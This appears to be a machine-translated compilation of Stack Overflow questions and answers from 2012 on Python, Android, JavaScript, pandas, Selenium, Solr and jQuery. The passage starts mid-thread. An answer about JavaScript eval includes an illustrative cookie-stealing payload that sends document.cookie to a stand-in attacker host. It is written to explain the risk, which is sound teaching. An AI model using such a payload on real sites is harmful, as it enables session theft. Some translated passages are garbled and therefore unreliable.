```

然后检查这些字符串中的单词：

```
In [6]: for word in data[1]:
    if any(word in s for s in rows+cols):
        print word # you can increment your counter here as well
   ...:         
ANT
SOB
TO 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:07:31.550

由于这是一项家庭作业，让我解释一下必须发生的事情。如果我的 Python 是正确的，在上面的代码中，你有一个列表列表。因此，您要做的第一件事是根据单个字符的列表构建您要查找的单词。例如，您的 ['A','N','T'] 列表将需要产生一个单词`ANT`. 现在，一旦您有了要查找的单词，就必须检查已完成的单词列表。在上面的示例中，这将是最终的列表元素。因此，您获取`newWords`列表并对其进行迭代，看看它是否包含在`originalList`. 如果找到，则将`foundWords`计数器加 1。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:07:35.290

像这样：使用 `all()`.

```
In [73]: lis1
Out[73]: [['A', 'N', 'T', 'T'], ['X', 'S', 'O', 'B']]

In [74]: lis2
Out[74]: ['ANT', 'BOX', 'SOB', 'TO']

In [75]: [x for x in lis2 if (any(x in "".join(y) for y in lis1) or any(x in "".join(k) for k in zip(*lis1)))]
Out[75]: ['ANT', 'SOB', 'TO'] 
```

# appfabric - AppFabric 错误 ERRCA0017 子状态 ES0006

> ID：13167378
> 
> 赞同：0
> 
> 时间：2012-10-31T21:02:52.643
> 
> 标签：appfabric, appfabric-cache

刚刚在我的 Windows 7 机器上安装了 Windows Server AppFabric 1.1，我正尝试在控制台应用程序中针对缓存客户端 API 编写一些代码，作为 AppFabric 评估的一部分。我的 app.config 如下所示：

```
 <configSections>
    <section name="dataCacheClient"     type="Microsoft.ApplicationServer.Caching.DataCacheClientSection,     Microsoft.ApplicationServer.Caching.Core, Version=1.0.0.0, Culture=neutral,     PublicKeyToken=31bf3856ad364e35" allowLocation="true" allowDefinition="Everywhere" />
  </configSections>
  <dataCacheClient>
  <hosts>
    <host name="pa-chouse2" cachePort="22233" />
  </hosts>
</dataCacheClient> 
```

我创建了一个新的缓存，并使用 Powershell cmdlet Grant-CacheAllowedClientAccount 将我的域用户帐户添加为允许的客户端帐户。我正在创建一个新的 DataCache 实例，如下所示：

```
using (DataCacheFactory cacheFactory = new DataCacheFactory())
{
  this.cache = cacheFactory.GetDefaultCache();
} 
```

当我调用 DataCache.Get 时，我会遇到以下异常：

```
ErrorCode<ERRCA0017>:SubStatus<ES0006>:There is a temporary failure. Please retry later. (One or more specified cache servers are unavailable, which could be caused by busy network or servers. For on-premises cache clusters, also verify the following conditions. Ensure that security permission has been granted for this client account, and check that the AppFabric Caching Service is allowed through the firewall on all cache hosts. Also the MaxBufferSize on the server must be greater than or equal to the serialized object size sent from the client.) 
```

如果有人能指出我缺少什么以使其正常工作，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T15:15:14.847

在几乎扯掉我剩下的小头发之后，终于弄清楚我的问题是什么。最初，我像这样创建我的 DataCache：

```
using (DataCacheFactory cacheFactory = new DataCacheFactory())
{
  this.cache = cacheFactory.GetDefaultCache();
} 
```

事实证明，DataCache 不喜欢将创建的 DataCacheFactory 处理掉。一旦我重构了代码，只要我需要我的 DataCache，我的 DataCacheFactory 就保持在范围内，它就可以按预期工作。

# java - Android - 全局变量 java.lang.NullPointerException

> ID：13167383
> 
> 赞同：0
> 
> 时间：2012-10-31T21:03:16.117
> 
> 标签：java, android

我有 2 种方法，它们使用相同的 2 个按钮 + 1 个 TextView。像这样的东西：

```
public void startChange(View v) {
    final Button start = (Button) findViewById(R.id.start);
    final Button restart = (Button) findViewById(R.id.restart);
    final TextView check = (TextView) findViewById(R.id.check);
    //TO-DO part - Sets check to something based on buttons TagID
}

public void restartChange (View v) {
    final Button start = (Button) findViewById(R.id.start);
    final Button restart = (Button) findViewById(R.id.restart);
    final TextView check = (TextView) findViewById(R.id.check);
    //TO-DO part - Restars everything to basic position
} 
```

一切正常.. 但是一旦我制作了这个按钮和 textview 全局变量，我就得到了 java.lang.NullPointerException。知道如何解决吗？

**编辑：** 问题解决了。只认为您要做的就是在 onCreate 方法中定义按钮和文本视图，而不是在全局定义中。

例子：

```
public class Example extends Activity {
    Button start;
    Button restart;
    TextView t;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        start = (Button) findViewById(R.id.start);
        restart = (Button) findViewById(R.id.restart);
       check = (TextView) findViewById(R.id.check);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-25T09:25:55.003

问题解决了。只认为您要做的就是在 onCreate 方法中定义按钮和文本视图，而不是在全局定义中。

例子：

```
public class Example extends Activity {
    Button start;
    Button restart;
    TextView t;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        start = (Button) findViewById(R.id.start);
        restart = (Button) findViewById(R.id.restart);
       check = (TextView) findViewById(R.id.check);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T23:59:19.550

您必须添加`setContentView(R.layout.main);`

```
public class Example extends Activity
{
    Button start;
    Button restart;
    TextView t;

    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        start = (Button) findViewById(R.id.start);
        restart = (Button) findViewById(R.id.restart);
        check = (TextView) findViewById(R.id.check);
    }
} 
```

# javascript - 使用 javascript 超级方法设置属性

> ID：13167386
> 
> 赞同：4
> 
> 时间：2012-10-31T21:03:25.143
> 
> 标签：javascript, super

> **可能重复：**
> [为什么我的 JS 对象属性被其他实例覆盖](https://stackoverflow.com/questions/13127589/why-are-my-js-object-properties-being-overwritten-by-other-instances)

为什么调用 setT 后属性“t”没有改变？我希望“4”作为输出，但它会打印“默认”。

```
function Car(i) {
  var id = i;
  var t = "default";

  this.getT = function() { return t; }
  this.setT = function(p) {
    t = p;  // attribute t isn't changed ..
  }
}

function ECar(id) {  
  Car.call(this, id);  // super constructor call

  this.setT = function(p) {  // override
    ECar.prototype.setT.call(this, p); // super call
  }
}

ECar.prototype = new Car();

ecar = new ECar(3);
ecar.setT(4);
alert(ecar.getT()); // prints default, not 4 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:30:28.907

> `ECar.prototype = new Car();`

在这一行`ECar`的原型获得一个上下文，所有`ECar`的实例都将在其中共享。

> `ECar.prototype.setT.call(this, p);`

此行将在**该**上下文中调用，而不是在调用*super* at 时创建的内容`Car.call(this, id);`。

你可以修复你的代码

```
function ECar(id) {  
  Car.call(this, id);  // super constructor call
  var carSetT = this.setT;
  this.setT = function(p) {
    carSetT.call(this, p);
  }
} 
```

但使用真正的原型会更好（并且更具可读性），例如

```
function Car() {}

Car.prototype.getT = function () { /* ... */ };
Car.prototype.setT = function () { /* ... */ };

function ECar() {}

ECar.prototype = new Car();
ECar.prototype.setT = function () { /* ... */ }; 
```

**编辑**：*注意*（正如@Bergi 建议的那样）

如果必须支持旧版浏览器，则应仅将`Child.prototype = new Parent()`其用作*继承，然后仅应使用空构造函数。*

JavaScript 中最兼容（其他语言）的继承方式是

```
Child.prototype = Object.create(Parent.prototype) 
```

（[MDN](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/create)说它受 IE 9 支持）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:29:48.413

> `// attribute t isn't changed ..`

请注意，这`t`不是“属性”，而是构造函数范围（“私有”）的局部*变量。*

> `ECar.prototype.setT.call(this, p); // super call`

无法按您的预期工作。您似乎想更改通过调用超级构造函数创建的变量（它仍然是该变量环境的本地变量，并且由*在构造*函数中创建的`getT`and函数公开。所以现在，您正在调用在该行- 更改在那里创建的变量。您当前对象上的函数无关紧要，因为它不使用内部关键字。`setT`*`ECar.prototype = new Car();``t``call``this`*

 *因此，您不想 a) 使用该原型 Car 的方法，但您自己的方法和 b) 根本不想`Car`为原型创建实例。另请参阅[*[不]*](https://stackoverflow.com/q/12592913/1048572)[在此处使用“新”关键字](https://stackoverflow.com/q/12592913/1048572)[的原因是什么？](https://stackoverflow.com/q/12592913/1048572)*. 在当前实例上应用超级构造函数就足够了。如果您想在仍然使用旧方法的同时扩展方法，则需要将它们（并且确切地说是它们）保存在变量中。*

 *```
function Car(id) {
    var t = "default";
    this.getT = function () {
        return t;
    };
    this.setT = function (p) {
        t = p;
    };
}

function ECar(id) {
    Car.call(this, id); // super constructor call

    var oldSetter = this.setT;
    this.setT = function (p) { // override
        oldSetter(p); // call the function which access this instance's "t"
    }
}
ECar.prototype = Object.create(Car.prototype, {constructor: {value: ECar}});

var ecar = new ECar(3);
ecar.setT(4);
console.log(ecar.getT()); // prints 4 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:19:05.450

```
function Car(i) {
   var id = i;
   var t = "default";

   this.getT = function() { return t; }
   this.setT = function(p) {
      t = p;  // attribute t isn't changed ..
   }
}

 function ECar(id) {  
     Car.call(this, id);  // super constructor call
 }

ECar.prototype = new Car();
ECar.prototype.constructor = ECar;  //Never forget doing this
ecar = new ECar(3);
ecar.setT(4);
alert(ecar.getT()); 
```

您不需要覆盖 setT 函数。​</p>**

# gridview - 我是否必须同时编写 ItemClick 和 Tapped 事件？

> ID：13167388
> 
> 赞同：1
> 
> 时间：2012-10-31T21:03:31.213
> 
> 标签：gridview, windows-8, touch, winrt-xaml, windows-store-apps

我注意到 GridView 控件同时存在 ItemClick 和 Tapped（和 RightTapped）事件。ItemClick 事件是否仅在响应鼠标单击时起作用，而 Tapped 事件是否仅在响应启用触摸的设备上的点击时起作用？

我认为它们将/应该是可互换的（点击支持触摸的设备将等同于点击非支持触摸的设备）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:14:17.183

它们都处理这两个事件，除非它们都被编码，在这种情况下，它们会像您期望的那样区分。所以编码一个，然后如果你需要触摸和点击来做一些不同的事情，那么两个都编码。

# xml - Selenium IDE 的新问题：来自 XPath

> ID：13167390
> 
> 赞同：2
> 
> 时间：2012-10-31T21:03:44.017
> 
> 标签：xml, xpath, selenium, firebug, selenium-ide

我想在 Selenium IDE 中使用的 Xpath 有问题。首先很奇怪，当我右键单击元素时，Selenium Options 没有出现。

其次，如果我用 Firebug 检查元素并复制 XPath，结果是这样的：

```
//html/body/div/div[4]/new:form/div[3]/table/tbody/tr/td/table/tbody/tr[17]/td[3]/a 
```

如果我在 Selenium 中插入此路径并单击“查找”，我会得到找不到定位器的消息。当我运行它时，它说：[error] invalid Xpath[2]:(then the path)

发现没有问题

```
//html/body/div/div[4]/ 
```

我认为问题出在“新：表单”部分，但我不明白为什么？！

我无权访问代码。但是当我删除萤火虫中的“新”时，它可以工作。这个问题有什么解决办法吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-09-17T17:34:25.220

在编写此问题时，Selenium 中没有适当支持 XPath 表达式中的命名空间。然而，[这已经改变了](https://code.google.com/p/selenium/issues/detail?id=1694)。一段时间以来（[大约 2015 年 3 月](https://github.com/SeleniumHQ/selenium/commit/4f5f96d92d12197d85d6faadc0bfb57c6a661c29)），您可以使用文档中出现的命名空间前缀来选择元素。

在此之前，这要困难得多，您需要像[接受的答案](https://stackoverflow.com/a/13167624/111575)中那样的解决方案。现在您可以使用原始问题中给出的表达式：

```
//html/body/div/div[4]/new:form.... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:21:11.787

在 Firebug 提供的 XPath 元素`form`中，定义在某个命名空间中，Firebug`new`用作前缀。我不知道 Selenium 是否支持带有命名空间的 XPath。无论如何，您可以稍微修改给定的 XPath，使用`*`而不是`new:form`，即：

```
//html/body/div/div[4]/*[local-name(.) = 'form']/div[3]/table/tbody/tr/td/table/tbody/tr[17]/td[3]/a 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-01T04:50:23.930

您可以安装**Firepath**，它是**Firebug 的扩展。**这将为您提供更清晰的 xpath。

# python - 在 Pandas 中过滤分组的 DataFrame

> ID：13167391
> 
> 赞同：44
> 
> 时间：2012-10-31T21:03:56.943
> 
> 标签：python, pandas, group-by

我正在`groupby`从 Pandas 创建一个对象，`DataFrame`并希望选择所有大小大于 1 的组。

例子：

```
 A  B
0  foo  0
1  bar  1
2  foo  2
3  foo  3 
```

以下似乎不起作用：

```
grouped = df.groupby('A')
grouped[grouped.size > 1] 
```

预期结果：

```
A
foo 0
    2
    3 
```

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2013-08-15T21:13:15.160

从 pandas 0.12 开始，您可以执行以下操作：

```
>>> grouped.filter(lambda x: len(x) > 1)

     A  B
0  foo  0
2  foo  2
3  foo  3 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2018-08-02T16:47:15.470

我发现`transform`它比`filter`非常大的数据框更有效：

```
element_group_sizes = df['A'].groupby(df['A']).transform('size')
df[element_group_sizes>1] 
```

或者，在一行中：

```
df[df['A'].groupby(df['A']).transform('size')>1] 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-11-01T17:00:54.720

如果您仍然需要解决方法：

```
In [49]: pd.concat([group for _, group in grouped if len(group) > 1])
Out[49]: 
     A  B
0  foo  0
2  foo  2
3  foo  3 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-02-13T18:07:31.850

您可以使用方法[`filter`](http://pandas.pydata.org/docs/reference/api/pandas.core.groupby.DataFrameGroupBy.filter.html#pandas.core.groupby.DataFrameGroupBy.filter)和属性[`shape`](http://pandas.pydata.org/docs/reference/api/pandas.DataFrame.shape.html#pandas.DataFrame.shape)：

```
df.groupby('A').filter(lambda x: x.shape[0] > 1) 
```

# java - Java 缺乏模板继承在 Android 中引起了严重的代码重复问题。有什么解决办法吗？

> ID：13167394
> 
> 赞同：6
> 
> 时间：2012-10-31T21:04:11.380
> 
> 标签：java, android, multiple-inheritance

这是特定于 Android 的。

我从一个自定义类派生了我在 Android 中的所有活动，该类提供了一个很好、干净的位置来放置应用程序中所有布局使用的通用代码，尤其是一些将布局注入我的布局的通用 setContentView() 覆盖代码。因此，典型的层次结构如下所示：

```
MyActivity extends MyBaseClass -> MyBaseClass extends Activity -> Activity 
```

对于我的一个应用程序，我需要 Google 地图支持。因此，我尝试将 MyBaseClass 转换为模板/泛型，以便可以执行以下操作：

```
MyActivity extends MyBaseClass<MapActivity> -> MyBaseClass<T> extends T -> T 
```

当然，编译失败是因为 Java 模板/泛型不像我在尝试后不久发现的 C++ 模板那么有用。所以我最终创建了一个完整的单独类作为临时解决方法：

```
MyActivity extends MyBaseMapClass -> MyBaseMapClass extends MapActivity -> MapActivity 
```

并将 MyBaseClass 中的所有代码复制到 MyBaseMapClass 中。除了涉及导入的一些小改动外，代码是相同的。它有效，但它不是一个好的解决方案。

我交叉手指说以上将是问题的结束，我再也不必重新审视它了。

不幸的是，我开始尝试使用更复杂的基类来混合片段和活动，并且上面的代码重复问题已经成为一个严重的问题。每当我对一个文件进行更改时，我都必须记住将其克隆到其他文件中，并且开发进展得足够快，以至于我很快就会失去同步。

Activity、MapActivity、FragmentActivity、ListActivity、PreferenceActivity 等。我是否需要为每一个我希望使用的派生类创建一个单独的派生类？我希望不会，因此，我已经限制了我的推导（因此我的一些活动没有某些功能）。我有时会使用两个单独的基类（其中一些活动需要将更多视图膨胀到布局中，但并非所有活动都需要这样做），这一事实进一步激怒了这个问题：

```
MyActivity extends MyBaseClass -> MyBaseClass extends Activity -> Activity

MyActivity2 extends AnotherBaseClass -> AnotherBaseClass extends MyBaseClass -> MyBaseClass extends Activity -> Activity 
```

如果我想在 Maps 中使用 AnotherBaseClass 的代码，我不仅要创建 MyBaseMapClass，还要创建 AnotherBaseMapClass 并复制代码。在这一点上，我最多有四个类，其中两个类是几千行克隆代码。复制代码让我很困扰，因为它使维护和开发变得更加困难。

派生 Android 类引入了复杂性，例如 findViewById() 是 Activity 基类的一部分。这很重要，因为我不确定如何编写接口或组合而不遇到我刚才描述的相同问题。

这里有人遇到过这个问题并提出了可行的解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T22:11:51.247

你为什么不直接创建一个带有静态函数的辅助类`styleActivity(Activity a)`呢？在这种情况下，这似乎是比使用继承更容易的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T22:35:27.497

所以基本上你想要多重继承，这是Java不支持的。

可以模拟多重继承

```
interface MyBaseInterface
    foo();
    bar();

class MyBaseClass implements MyBaseInterface
    foo(){ ... };
    bar(){ ... };

class MyMapActivity extends MapActivity implements MyBaseInterface

    // boiler plate c&p
    MyBaseClass base;
    foo(){ return base.foo(); }
    bar(){ return base.bar(); } 
```

但是， MyMapActivity 必须的原因是什么`implements MyBaseInterface`？可能没有。

也许这已经足够好了

```
class MyBaseClass
    foo(){ ... };
    bar(){ ... };

class MyMapActivity extends MapActivity

    public final MyBaseClass base; 
```

所以每次你需要对待`MyMapActivity`as`MyBaseClass`时，只需使用`base`变量。

```
 activity.base.foo(); 
```

用于抽象/重写方法

```
class MyMapActivity extends MapActivity

    public final MyBaseClass base = new MyBaseClass()
    {
        foo(){ do my foo thing; } 
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T23:15:54.210

实际上，您自己的陈述“Java 模板/泛型不如 C++ 模板有用”是您问题的最佳答案:)。

不幸的是，像这样的构造`class MyClass<T> extends T`在 java 中是非法的。即使它们是合法的，它们也意味着`class MyClass extends Object`参数化类型在字节码中被擦除。（阅读有关类型擦除[http://www.angelikalanger.com/GenericsFAQ/FAQSections/TechnicalDetails.html#What%20is%20type%20erasure?](http://www.angelikalanger.com/GenericsFAQ/FAQSections/TechnicalDetails.html#What%20is%20type%20erasure?)）

我会坚持 SimonSays 在另一个答案中建议的 Helper 类。

```
class MyHelper<T extends Activity> {

    final T activity;

    public MyHelper(T activity) {
        this.activity = activity;

        //here you can access Acitivities methods on T object 
        //and compiler will not say a single bad word ;)
        //unfotunately only public methods
        activity.getLayoutInflater();
    }

    public T getActivity() {
        return activity;
    }
} 
```

# javascript - Javascript eval() 有那么危险吗？

> ID：13167403
> 
> 赞同：5
> 
> 时间：2012-10-31T21:04:46.210
> 
> 标签：javascript, security, eval

> **可能重复：**
> [什么时候 JavaScript 的 eval() 不是邪恶的？](https://stackoverflow.com/questions/197769/when-is-javascripts-eval-not-evil)

我正在编写一个脚本，用户必须在其中写入货币金额，一些示例可能是（用户输入>>转换为），使用美元作为默认货币：

```
50       >> 50.0 USD
50.5     >> 50.5 USD
50+1 USD >> 51.0 USD
50 GBP   >> 50.0 GBP 
```

我想让这尽可能顺利，因此我想使用 JavaScript（它是一个基于 PHP/MySql + JavaScript 的网络应用程序）。我想使用正则表达式来过滤输入，运行它`eval()`并返回它。

这是一个坏主意吗？我已经阅读了一些关于`eval()`成为安全问题的主题。我只是不明白怎么做。用户可以轻松运行 JavaScript 吗？

请记住，我将在稍后阶段使用 PHP 验证所有输入服务器端。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-31T21:28:30.150

没错，最终用户无论如何都可以通过浏览器的开发者控制台轻松执行任意 JavaScript（我一直这样做）。您必须担心的是攻击者劫持了您的功能，以`eval`达到自己的目的。

原因`eval`通常被认为是危险的，因为不受信任的代码*很*容易潜入。考虑一个允许您通过查询字符串指定输入的页面，其中输入框预先填充了查询字符串中的值。

攻击者可以传播包含窃取用户登录 cookie 的代码的链接：

```
/some/url?amount=var i=new Image();i.src='http://badguy.ru/x?' + document.cookie; 
```

（显然需要正确的 URL 编码；这是为了说明。）

或者，当验证失败时，您的 PHP 脚本可能会将已发布的数据回显到您的表单中。攻击者可以创建一个特制的表单，使用相同的 cookie 窃取代码发布到您的表单。

这些攻击中的每一个都可以通过使用`httpOnly`cookie（以防止登录 cookie 被盗）或确保数据被清理来缓解 - 但关键是这甚至还没有接近详尽的列出事情可能出错的原因。例如，注入的脚本仍然可以在金额字段中插入 1000 并尝试将该金额转移到攻击者的帐户（如果这是一个汇款页面）。

即使您使用正则表达式来清理输入这一事实也不一定能保护您：**[完全可以用括号](http://utf-8.jp/public/jjencode.html)****编写任意 JavaScript ！**

所以底线是，如果您可以**绝对确定**输入进入您的文本字段的唯一方式是通过用户输入，那么您很好：用户没有获得他们无法做到的任何事情通过控制台。但是，如果攻击者能够以某种方式将他们自己的数据放入该字段，`eval`那么它可能会使您暴露于漏洞中。

也可以看看：

*   [JavaScript 评估简单的数学字符串，如 5*1.2 (eval/white-list?)](https://stackoverflow.com/q/9914301/201952)
*   [JavaScript 只用括号写？](https://security.stackexchange.com/q/8263/4906)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-10-31T21:08:26.313

如果您需要它，请使用它。

这是一个很好的链接，它讨论了安全性......以及对“eval（）”的其他常见反对意见：

> *   [http://javascriptweblog.wordpress.com/2010/04/19/how-evil-is-eval/](http://javascriptweblog.wordpress.com/2010/04/19/how-evil-is-eval/)
> 
> 安全呢？如果您的软件为 eval 提供了它的论点，那么在这方面就没什么好担心的了。当然，评估输入框的值是不明智的，但是在您自己的服务器代码生成的响应上运行 eval 应该不会带来特殊风险。还要记住，潜在的攻击者不会对客户端评估造成任何损害，而这是他们无法通过现代浏览器控制台更轻松地实现的。

恕我直言 ...

# search - Solr - 搜索多个字段

> ID：13167404
> 
> 赞同：1
> 
> 时间：2012-10-31T21:04:46.757
> 
> 标签：search, solr, global

我试图允许对我的 solr schema.xml 中定义的所有字段进行全局搜索。我有以下领域：

```
 <field name="catchall" 
       type="text_en_splitting" 
       stored="true" 
       indexed="true"
       multiValued="true" /> 
```

然后，我有：

```
 <copyField source="*" dest="catchall"/>
 <defaultSearchField>catchall</defaultSearchField> 
```

但是，当我在不指定字段的情况下进行搜索时，它只搜索此字段：

```
 <field name="text" type="text_en_splitting" multiValued="false"/> 
```

我的配置是否缺少要在所有字段中搜索的内容？以下是默认搜索中未包含的字段示例：

```
<field name="summary" type="text_en_splitting" indexed="true" stored="true" multiValued="true"/> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:42:15.413

我想我弄清楚了这个问题。显然，对于 Solr 3.6.1，默认搜索字段是在 solrconfig.xml 中指定的，而不是在 schema.xml 中。在 solrconfig.xml 中，我将元素值从 text 更改为 catchall。

```
<requestHandler name="/select" class="solr.SearchHandler">
 <lst name="defaults">
   <str name="echoParams">explicit</str>
   <int name="rows">10</int>
   <str name="df">catchall</str>
 </lst>
 </requestHandler> 
```

# android - 移动设备的自动化框架

> ID：13167405
> 
> 赞同：1
> 
> 时间：2012-10-31T21:04:48.613
> 
> 标签：android, ios, unit-testing, mobile, automated-tests

我正在尝试使用类似于 Selenium 的自动化框架来测试本机应用程序（android 和 IOS 应用程序）。有没有人有适合这些任务的框架列表。首选基于 Java 的框架，但也欢迎其他框架。我想回顾每​​个框架的优点并做出最终决定

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T22:43:09.057

有很多选项可以测试移动应用程序，但并非所有选项都是跨平台的。你说这对你很重要，所以我会说 MonkeyTalk (http://www.gorillalogic.com/testing-tools/monkeytalk) 葫芦 (http://blog.lesspainful.com/) 或新的葫芦驱动项目 (一种葫芦的形式，看起来和感觉更像 ebay 刚刚宣布的硒）[https://github.com/calabash-driver/calabash-driver](https://github.com/calabash-driver/calabash-driver)和[https://github.com/freynaud/ios-driver](https://github.com/freynaud/ios-driver)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T23:35:47.287

[Appium](http://appium.io/)是一个与 Selenium 兼容的移动自动化工具，可让您使用 Selenium 客户端库以 Java 和其他语言编写测试。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-31T21:10:50.100

在过去的 14 个月里，我的团队一直在使用 Frank，而且效果非常好。它将自己描述为：“用于原生 iOS 应用程序的 Selenium”。这是一个相当活跃的项目，并且有一个非常有帮助的小社区。

你可以从这里开始：[与 Frank 一起测试](http://testingwithfrank.com/index.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-20T04:28:46.933

对于 iOS：与基于 ruby​​ 的[Frank](https://github.com/moredip/Frank)不同，[KIF](https://github.com/kif-framework/KIF)是一个 100% obj-c 解决方案，它可以更轻松地与您的 iOS 代码集成。

看看[这里](https://stackoverflow.com/questions/17229460/kif-how-to-auto-run-stress-test-an-ios-app-to-find-the-cause-of-a-rare-ui-bug/17289283#17289283)的例子，我是如何在我的 iOS 项目中使用[KIF的，以及我选择它而不是 Frank 的原因。](https://github.com/kif-framework/KIF)

# jquery - 仅选择 div 上一个图像

> ID：13167407
> 
> 赞同：1
> 
> 时间：2012-10-31T21:04:52.373
> 
> 标签：jquery

我有以下代码通过将鼠标悬停在拇指图像上来更改全尺寸图像 -

```
<script type="text/javascript">
    $('.thumbimage a img').on('hover',function(){
            $('.fullsizeimage a img').attr('src',$(this).attr('src'));
        });
</script> 
```

如何设置它以使其仅更改其上方的全尺寸图像以及所有其他全尺寸图像？

我尝试了以下没有运气：

```
 <script type="text/javascript">
        $('.thumbimage a img').on('hover',function(){
            $('.thumbimage a img').prev('.fullsizeimage a img').attr('src',$(this).attr('src'));
        });
        </script> 
```

[http://jsfiddle.net/CUZBa/19/](http://jsfiddle.net/CUZBa/19/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:07:33.580

看起来像是`row`一个父元素。

```
$('.thumbimage a img').on('click hover', function() {
    $(this).parents('.row').find('.fullsizeimage img').attr('src', $(this).attr('src'));
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:13:22.397

[`.prev()`](http://api.jquery.com/prev/)将遍历元素的兄弟姐妹而不是其祖先..

您可以[`.closest()`](http://api.jquery.com/closest/)在这种情况下使用

尝试这个

```
$('.thumbimage a img').on('click hover', function() {
    $(this).closest('.row').find('.fullsizeimage img').attr('src', $(this).attr('src'));
});​ 
```

# xaml - 将字典传递给行为

> ID：13167411
> 
> 赞同：0
> 
> 时间：2012-10-31T21:05:00.473
> 
> 标签：xaml, c#-4.0, silverlight-4.0, behavior, attachedbehaviors

我有一个像这样的简单行为

```
public class KeyBoardChangeBehavior : Behavior<UserControl>
{
    public Dictionary<string, int> DataToCheckAgainst; 

    protected override void OnAttached()
    {
        AssociatedObject.KeyDown += _KeyBoardBehaviorKeyDown;
    }

    protected override void OnDetaching()
    {
        AssociatedObject.KeyDown -= _KeyBoardBehaviorKeyDown;
    }

        void _KeyBoardBehaviorKeyDown(object sender, KeyEventArgs e)
    {
        // My business will go there 
    }

} 
```

我想从视图中为这个字典赋值，我称之为如下

```
<UserControl x:Class="newhope2.MainPage"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
             xmlns:Interactivity="clr-namespace:System.Windows.Interactivity;assembly=System.Windows.Interactivity"
             xmlns:Behaviors="clr-namespace:newhope2"
    mc:Ignorable="d"
    d:DesignHeight="300" d:DesignWidth="400">

    <Interactivity:Interaction.Behaviors>
        <Behaviors:KeyBoardChangeBehavior  />
    </Interactivity:Interaction.Behaviors>

    <Grid x:Name="LayoutRoot" Background="White">

    </Grid>
</UserControl> 
```

但是我如何才能将此字典传递给 XAML 或其背后代码的行为

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T01:04:15.080

要采用 Binding，属性必须是`DependencyProperty`.

您需要在行为中定义属性，如下所示：

```
 public Dictionary<string, int> DataToCheckAgainst
    {
        get { return (Dictionary<string, int>)GetValue(DataToCheckAgainstProperty); }
        set { SetValue(DataToCheckAgainstProperty, value); }
    }

    public static readonly DependencyProperty DataToCheckAgainstProperty =
        DependencyProperty.Register(
            "DataToCheckAgainst",
            typeof(Dictionary<string, int>),
            typeof(KeyBoardChangeBehavior),
            new PropertyMetadata(null)); 
```

使用 Visual Studio“propdp”片段。

用法如阿迪所说，像这样：

```
<Interactivity:Interaction.Behaviors>
    <Behaviors:KeyBoardChangeBehavior DataToCheckAgainst="{Binding MyDictionary}" />
</Interactivity:Interaction.Behaviors> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:31:07.750

您需要做的就是将字典声明为属性，然后通过绑定将值传递给它。

在行为中：

```
public Dictionary<string, int> DataToCheckAgainst { get; set; } 
```

在 XAML 中：

```
<Interactivity:Interaction.Behaviors>
    <Behaviors:KeyBoardChangeBehavior DataToCheckAgainst="{Binding MyDictionary}" />
</Interactivity:Interaction.Behaviors> 
```

# objective-c - 处理与 UIControl 的用户交互结束的首选事件是什么？

> ID：13167413
> 
> 赞同：0
> 
> 时间：2012-10-31T21:05:30.580
> 
> 标签：objective-c, cocoa-touch, events

我有一个视图，上面有多个动态创建的 UITextfields 和 UISegmented 控件（但就这个问题而言，也可能有 UIButtons、UISwitches、UISliders 或任何其他从 UIControl 继承的东西）。每当用户完成与任何控件的交互时，我都想执行一个动作，而不管它属于哪个控件子类。通过查看其他问题，我想我想在`addTarget:action:forControlEvents:`创建每个控件后使用它们来添加观察者，但我不知道我在寻找哪个事件。[我已经尝试了此处 Apple Docs](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIControl_Class/Reference/Reference.html)中列出的所有似乎相关的内容，但似乎没有一个每次都被触发。我正在寻找类似`.LostFocus`VBA 的东西，但我似乎无法找出那是什么 - 我知道有一个`becomeFirstResponder`使控件处于活动状态的方法，但我找不到像“lostFirstResponder”事件这样的东西。

